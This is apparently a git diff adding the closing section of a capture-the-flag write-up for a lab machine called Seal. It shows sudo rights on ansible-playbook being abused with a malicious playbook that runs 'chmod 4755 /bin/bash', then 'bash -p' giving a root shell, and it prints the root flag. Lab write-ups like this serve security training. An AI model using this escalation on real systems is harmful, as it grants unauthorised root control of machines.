@@ -632,4 +632,91 @@ luis
 
 <br />
 
+Once into `luis`, we run a `sudo -l` to see his `sudoers` privileges and discover something:
 
+<br />
+
+```bash
+luis@seal:~$ sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+```
+
+<br />
+
+
+This user can `run` as `root` ansible-playbook to `execute` any .yml script.
+
+This is very `dangerous`, because we can `create` a `malicious .yml` file to `run` a `command`. Let's do it!
+
+<br />
+
+`Malicious .yml Content`:
+
+```yaml
+- hosts: localhost
+  tasks:
+  - name: Give SUID permissions to the BASH
+    shell: chmod 4755 /bin/bash
+```
+
+<br />
+
+Once `created` the file, we `run` it:
+
+<br />
+
+```bash
+luis@seal:/tmp/Privesc$ sudo /usr/bin/ansible-playbook malicious.yml 
+[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'
+
+PLAY [localhost] ***********************************************************************************************************************************************************************
+
+TASK [Gathering Facts] *****************************************************************************************************************************************************************
+ok: [localhost]
+
+TASK [Give SUID permissions to the BASH] ***********************************************************************************************************************************************
+[WARNING]: Consider using the file module with mode rather than running 'chmod'.  If you need to use command because file is insufficient you can add 'warn: false' to this command
+task or set 'command_warnings=False' in ansible.cfg to get rid of this message.
+changed: [localhost]
+
+PLAY RECAP *****************************************************************************************************************************************************************************
+localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
+```
+
+<br />
+
+It seems like the `command` was executed `successful`, let's `check` it:
+
+<br />
+
+```bash
+luis@seal:/tmp/Privesc$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+```
+
+<br />
+
+YES!! We got it, can run a `bash` as `root`!!
+
+<br />
+
+```bash
+luis@seal:/tmp/Privesc$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+32c8d0788372b7a9f20cc01ea76d9468
+```
+
+<br />
+
+Seal machine rooted!!!
+
+I have enjoyed a lot this machine! Hope you too!
+
+Keep hacking!!❤️❤️
